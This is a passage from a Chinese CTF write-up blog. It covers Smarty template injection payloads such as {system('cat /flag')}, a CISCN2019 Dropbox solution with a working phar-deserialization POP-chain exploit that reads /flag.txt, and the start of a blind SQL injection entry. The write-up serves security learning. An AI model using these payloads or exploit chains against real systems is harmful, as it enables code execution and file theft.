<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;system(&#39;cat &#x2F;flag&#39;)&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210423004822.png" alt="img"><br>没啥问题</p>
<p>值得注意的是：之前整理过的关于smarty模板注入的语句用不了因为，，那个版本比较落后</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;self::getStreamVariable(&quot;file:&#x2F;&#x2F;&#x2F;proc&#x2F;self&#x2F;loginuid&quot;)&#125;</span><br></pre></td></tr></table></figure>

<p>就是这个,原因：<strong>3.1.30的Smarty版本中官方已经把该静态方法删除</strong></p>
<p>其他解题语句:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;if&#125;标签</span><br><span class="line">官方文档中看到这样的描述：</span><br><span class="line"></span><br><span class="line">Smarty的&#123;if&#125;条件判断和PHP的if非常相似，只是增加了一些特性。每个&#123;if&#125;必须有一个配对的&#123;&#x2F;if&#125;，也可以使用&#123;else&#125; 和 &#123;elseif&#125;，全部的PHP条件表达式和函数都可以在if内使用，如||*, or, &amp;&amp;, and, is_array(), 等等，如：&#123;if is_array($array)&#125;&#123;&#x2F;if&#125;*</span><br><span class="line"></span><br><span class="line">既然全部的PHP函数都可以使用，那么我们是否可以利用此来执行我们的代码呢？</span><br><span class="line"></span><br><span class="line">将XFF头改为&#123;if phpinfo()&#125;&#123;&#x2F;if&#125;，可以看到题目执行了phpinfo()</span><br><span class="line"></span><br><span class="line">原文链接：https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_45521281&#x2F;article&#x2F;details&#x2F;107556915</span><br></pre></td></tr></table></figure>

<h2 id="CISCN2019-华北赛区-Day1-Web1-Dropbox"><a href="#CISCN2019-华北赛区-Day1-Web1-Dropbox" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web1]Dropbox"></a>[CISCN2019 华北赛区 Day1 Web1]Dropbox</h2><p>题目提示phar，记得是反序列化的内容：看看有无源码：没找到，上传一下文件，发现可以下载，尝试看看能不能修改下载位置，——存在任意文件下载漏洞，<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210423005557.png" alt="img" style="zoom:67%;"><br>下载得到源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    header(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;网盘管理&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;link href=<span class="string">&quot;static/css/bootstrap.min.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">    &lt;link href=<span class="string">&quot;static/css/panel.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;static/js/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;static/js/bootstrap.bundle.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;static/js/toast.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;static/js/panel.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;nav aria-label=<span class="string">&quot;breadcrumb&quot;</span>&gt;</span><br><span class="line">    &lt;ol class=&quot;breadcrumb&quot;&gt;</span><br><span class="line">        &lt;li class=&quot;breadcrumb-item active&quot;&gt;管理面板&lt;/li&gt;</span><br><span class="line">        &lt;li class=&quot;breadcrumb-item active&quot;&gt;&lt;label for=&quot;fileInput&quot; class=&quot;fileLabel&quot;&gt;上传文件&lt;/label&gt;&lt;/li&gt;</span><br><span class="line">        &lt;li class=&quot;active ml-auto&quot;&gt;&lt;a href=&quot;#&quot;&gt;你好 &lt;?php echo $_SESSION[&#x27;username&#x27;]?&gt;&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">    &lt;/ol&gt;</span><br><span class="line">&lt;/nav&gt;</span><br><span class="line">&lt;input type=&quot;file&quot; id=&quot;fileInput&quot; class=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;div class=&quot;top&quot; id=&quot;toast-container&quot;&gt;&lt;/div&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> FileList($_SESSION[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br><span class="line">$a-&gt;Name();</span><br><span class="line">$a-&gt;Size();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$dbaddr = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">$dbuser = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">$dbpass = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">$dbname = <span class="string">&quot;dropbox&quot;</span>;</span><br><span class="line">$db = <span class="keyword">new</span> mysqli($dbaddr, $dbuser, $dbpass, $dbname);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $db;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $db;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db = $db;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">user_exist</span>(<span class="params">$username</span>) </span>&#123;</span><br><span class="line">        $stmt = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;</span>);</span><br><span class="line">        $stmt-&gt;bind_param(<span class="string">&quot;s&quot;</span>, $username);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        $stmt-&gt;store_result();</span><br><span class="line">        $count = $stmt-&gt;num_rows;</span><br><span class="line">        <span class="keyword">if</span> ($count === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add_user</span>(<span class="params">$username, $password</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;user_exist($username)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $password = sha1($password . <span class="string">&quot;SiAchGHmFx&quot;</span>);</span><br><span class="line">        $stmt = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">&quot;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&quot;</span>);</span><br><span class="line">        $stmt-&gt;bind_param(<span class="string">&quot;ss&quot;</span>, $username, $password);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">verify_user</span>(<span class="params">$username, $password</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;user_exist($username)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $password = sha1($password . <span class="string">&quot;SiAchGHmFx&quot;</span>);</span><br><span class="line">        $stmt = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">&quot;SELECT `password` FROM `users` WHERE `username` = ?;&quot;</span>);</span><br><span class="line">        $stmt-&gt;bind_param(<span class="string">&quot;s&quot;</span>, $username);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        $stmt-&gt;bind_result($expect);</span><br><span class="line">        $stmt-&gt;fetch();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($expect) &amp;&amp; $expect === $password) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files;</span><br><span class="line">    <span class="keyword">private</span> $results;</span><br><span class="line">    <span class="keyword">private</span> $funcs;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$path</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">        $filenames = scandir($path);</span><br><span class="line"></span><br><span class="line">        $key = array_search(<span class="string">&quot;.&quot;</span>, $filenames);</span><br><span class="line">        <span class="keyword">unset</span>($filenames[$key]);</span><br><span class="line">        $key = array_search(<span class="string">&quot;..&quot;</span>, $filenames);</span><br><span class="line">        <span class="keyword">unset</span>($filenames[$key]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> ($filenames <span class="keyword">as</span> $filename) &#123;</span><br><span class="line">            $file = <span class="keyword">new</span> File();</span><br><span class="line">            $file-&gt;open($path . $filename);</span><br><span class="line">            array_push(<span class="keyword">$this</span>-&gt;files, $file);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;results[$file-&gt;name()] = <span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$func, $args</span>) </span>&#123;</span><br><span class="line">        array_push(<span class="keyword">$this</span>-&gt;funcs, $func);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $table = <span class="string">&#x27;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#x27;</span>;</span><br><span class="line">        $table .= <span class="string">&#x27;&lt;thead&gt;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;funcs <span class="keyword">as</span> $func) &#123;</span><br><span class="line">            $table .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27;</span> . htmlentities($func) . <span class="string">&#x27;&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $table .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        $table .= <span class="string">&#x27;&lt;/thead&gt;&lt;tbody&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;results <span class="keyword">as</span> $filename =&gt; $result) &#123;</span><br><span class="line">            $table .= <span class="string">&#x27;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">foreach</span> ($result <span class="keyword">as</span> $func =&gt; $value) &#123;</span><br><span class="line">                $table .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27;</span> . htmlentities($value) . <span class="string">&#x27;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            $table .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27;</span> . htmlentities($filename) . <span class="string">&#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;下载&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;删除&lt;/a&gt;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            $table .= <span class="string">&#x27;&lt;/tr&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> $table;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params">$filename</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = $filename;</span><br><span class="line">        <span class="keyword">if</span> (file_exists($filename) &amp;&amp; !is_dir($filename)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">name</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> basename(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">size</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $size = filesize(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        $units = <span class="keyword">array</span>(<span class="string">&#x27; B&#x27;</span>, <span class="string">&#x27; KB&#x27;</span>, <span class="string">&#x27; MB&#x27;</span>, <span class="string">&#x27; GB&#x27;</span>, <span class="string">&#x27; TB&#x27;</span>);</span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">0</span>; $size &gt;= <span class="number">1024</span> &amp;&amp; $i &lt; <span class="number">4</span>; $i++) $size /= <span class="number">1024</span>;</span><br><span class="line">        <span class="keyword">return</span> round($size, <span class="number">2</span>).$units[$i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">detele</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        unlink(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>还有一个class.php，downloa.php也逃不了<br>审计审计~</p>
<p>看了一圈没看到反序列化的函数，回去仔细看了看phar反序列化</p>
<h3 id="phar反序列化原理"><a href="#phar反序列化原理" class="headerlink" title="phar反序列化原理"></a>phar反序列化原理</h3><p>phar://也是流包装的一种</p>
<h4 id="a-stub"><a href="#a-stub" class="headerlink" title="a stub"></a>a stub</h4><p>可以理解为一个标志，格式为<code>xxx&lt;?php xxx;__HALT_COMPILER();?&gt;</code>，前面内容不限，但必须以<code>__HALT_COMPILER();?&gt;</code>来结尾，否则phar扩展将无法识别这个文件为phar文件。</p>
<p>phar的本质是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180908164942-210cf44c-b344-1.png"><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210423013011.png" alt="img"></a></p>
<h4 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h4><p>根据文件结构我们来自己构建一个phar文件，php内置了一个Phar类来处理相关操作</p>
<p><strong>注意：要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件。</strong></p>
<p>phar.php:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class TestObject &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    $phar &#x3D; new Phar(&quot;phar.phar&quot;); &#x2F;&#x2F;后缀名必须为phar</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); &#x2F;&#x2F;设置stub</span><br><span class="line">    $o &#x3D; new TestObject();</span><br><span class="line">    $o -&gt; data&#x3D;&#39;hu3sky&#39;;</span><br><span class="line">    $phar-&gt;setMetadata($o); &#x2F;&#x2F;将自定义的meta-data存入manifest</span><br><span class="line">    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); &#x2F;&#x2F;添加要压缩的文件</span><br><span class="line">    &#x2F;&#x2F;签名自动计算</span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>访问后,会生成一个phar.phar在当前目录下。<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180908164942-211fe3fe-b344-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180908164942-211fe3fe-b344-1.png" alt="img"></a><br>用winhex打开<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180908164943-213f55b8-b344-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180908164943-213f55b8-b344-1.png" alt="img"></a><br>可以明显的看到meta-data是以序列化的形式存储的。<br>有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过<code>phar://</code>伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下：<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180908164943-2151deae-b344-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180908164943-2151deae-b344-1.png" alt="img"></a></p>
<p>phar_fan.php</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class TestObject&#123;</span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo $this -&gt; data;   &#x2F;&#x2F; TODO: Implement __destruct() method.</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">include(&#39;phar:&#x2F;&#x2F;phar.phar&#39;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>输出hu3sky</p>
<h4 id="利用点"><a href="#利用点" class="headerlink" title="利用点"></a>利用点</h4><p>前面说道，php识别phar文件是通过其文件头的stub，就是那段代码，对其他是没有要求的，也就意味着，我们可以将phar文件伪装成其他格式的文件！</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class TestObject &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    $phar &#x3D; new Phar(&#39;phar.phar&#39;);</span><br><span class="line">    $phar -&gt; startBuffering();</span><br><span class="line">    $phar -&gt; setStub(&#39;GIF89a&#39;.&#39;&lt;?php __HALT_COMPILER();?&gt;&#39;);   &#x2F;&#x2F;设置stub，增加gif文件头</span><br><span class="line">    $phar -&gt;addFromString(&#39;test.txt&#39;,&#39;test&#39;);  &#x2F;&#x2F;添加要压缩的文件</span><br><span class="line">    $object &#x3D; new TestObject();</span><br><span class="line">    $object -&gt; data &#x3D; &#39;hu3sky&#39;;</span><br><span class="line">    $phar -&gt; setMetadata($object);  &#x2F;&#x2F;将自定义meta-data存入manifest</span><br><span class="line">    $phar -&gt; stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h4 id="构造代码"><a href="#构造代码" class="headerlink" title="构造代码"></a>构造代码</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eval.php</span><br><span class="line">&lt;?php</span><br><span class="line">class AnyClass&#123;</span><br><span class="line">    var $output &#x3D; &#39;echo &quot;ok&quot;;&#39;;</span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        eval($this -&gt; output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$phar &#x3D; new Phar(&#39;phar.phar&#39;);</span><br><span class="line">$phar -&gt; stopBuffering();</span><br><span class="line">$phar -&gt; setStub(&#39;GIF89a&#39;.&#39;&lt;?php __HALT_COMPILER();?&gt;&#39;);</span><br><span class="line">$phar -&gt; addFromString(&#39;test.txt&#39;,&#39;test&#39;);</span><br><span class="line">$object &#x3D; new AnyClass();</span><br><span class="line">$object -&gt; output&#x3D; &#39;phpinfo();&#39;;</span><br><span class="line">$phar -&gt; setMetadata($object);</span><br><span class="line">$phar -&gt; stopBuffering();</span><br></pre></td></tr></table></figure>

<p>理解一下：phar的实现过程应该为，我们创建一个phar文件，对于这个类的meta—data是以序列化的形式存储的<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210423141927.png" alt="img" style="zoom:67%;"></p>
<p>当你读取他是则会进行反序列化输出:<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210423142439.png" alt="img" style="zoom:50%;"></p>
<p>补充几点：<br>1.phar是一个压缩文件，里面存放着我们要压缩的文件以及一些存储的属性头信息（以序列化的形式存在）之类，当文件操作函数通过phar://伪协议解析phar文件时就会将数据反序列化</p>
<h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><p>1.phar文件要能够上传到服务器端。<br>2.如<code>file_exists()，fopen()，file_get_contents()，file()</code>等文件操作的函数要有可用的魔术方法作为”跳板”。<br>3.文件操作函数的参数可控，且:<code>:、/、phar</code>等特殊字符没有被过滤。<br>问题：这个有可用的魔术方法做跳板是为啥？<br>指的是使用文件操作函数的魔术方法跳板吗？——是的</p>
<h3 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h3><p>总觉得还是有哪里懵懵的<br>有可用的魔术方法做跳板按照我的理解是，我们的读取phar反序列化出来的内容<br>审计下代码，构造一下pop：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="comment">//file 类中存在 file_get_contents方法，可以用来读取文件，如何到这里来</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;db-&gt;close();</span><br><span class="line">&#125;<span class="comment">//思路瞬间清晰了不少，将db赋值为file，怎么跳？</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$func, $args</span>) </span>&#123;</span><br><span class="line">       array_push(<span class="keyword">$this</span>-&gt;funcs, $func);</span><br><span class="line">       <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">           <span class="keyword">$this</span>-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;<span class="comment">//利用call魔术方法：__call 调用不可访问或不存在的方法时被调用</span></span><br></pre></td></tr></table></figure>

<p>pop链如下：<br>db(file)-&gt;close()=&gt;__call($file(file)-&gt;close())=&gt;file_get_contents=&gt;FileList里面的destruct输出回到页面上(当然，这里是我们要构造入文件内令其反序列化的内容)</p>
<p>1.构造phar文件：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $db;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>(<span class="keyword">new</span> File());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename=<span class="string">&#x27;/flag.txt&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$user = <span class="keyword">new</span> User();</span><br><span class="line">$user-&gt;db=<span class="keyword">new</span> FileList();</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&#x27;phar.phar&#x27;</span>);</span><br><span class="line">$phar -&gt; stopBuffering();</span><br><span class="line">$phar -&gt; addFromString(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line">$phar -&gt; setStub(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);</span><br><span class="line">$phar -&gt; setMetadata($user);</span><br><span class="line">$phar -&gt; stopBuffering();</span><br></pre></td></tr></table></figure>

<p>不知道为啥下午尝试的时候就是没法出flag，因此还去和wp对比了一下 发现也没啥不同的呀？然后补充一个download.php中的ini_set<code>ini_set(“open_basedir”, getcwd() . “:/etc:/tmp”);</code>这个函数执行后，我们通过Web只能访问当前目录、/etc和/tmp三个目录，所以只能在delete.php中利用payload，而不是download.php。</p>
<p>补充第二个点，一直不是很清楚在哪里解析了phar://于是在本地跑了一下<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210424012555.png" alt="img" style="zoom:67%;"><br>原来是在这，然后接下来尽管返回的false，但是phar已经被解析了，接下来就会继续执行反序列化操作，进入我们构造的链了</p>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>首先是思路小结：<br>其实是因为一开始题目提示phar，所以自然而然就联想到要去找源码，看看序列化的点，所以此时就不会想到在登录框sql注入浪费时间，接下来尝试了各种功能，抓包，发现下载文件是可控的，所以接下来下载源码来审计，构造反序列语句就可以了</p>
<h4 id="phar学习小结"><a href="#phar学习小结" class="headerlink" title="phar学习小结"></a>phar学习小结</h4><p>1.phar是一个压缩文件，我们构造的内容会以文件属性的形式序列化后存在于文件头中<br>2.phar在被使用过程中会进行反序列化操作，例如，读取文件，查询文件是否存在，总之就是上面那几个文件函数，所以这个思路就是如何让我们的文件被读取？<br>3.我们传入的删除文件的操作</p>
]]></content>
  </entry>
  <entry>
    <title>buuctf15</title>
    <url>/2021/05/15/buuctf15/</url>
    <content><![CDATA[<h2 id="WUSTCTF2020-颜值成绩查询"><a href="#WUSTCTF2020-颜值成绩查询" class="headerlink" title="[WUSTCTF2020]颜值成绩查询"></a>[WUSTCTF2020]颜值成绩查询</h2><p>这题sql注入，过滤了空格测试语句</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#x2F;**&#x2F;and&#x2F;**&#x2F;1&#x3D;1</span><br><span class="line">1&#x2F;**&#x2F;and&#x2F;**&#x2F;1&#x3D;2</span><br></pre></td></tr></table></figure>

<p>盲注：需要写脚本=：<br>构造payload：</p>
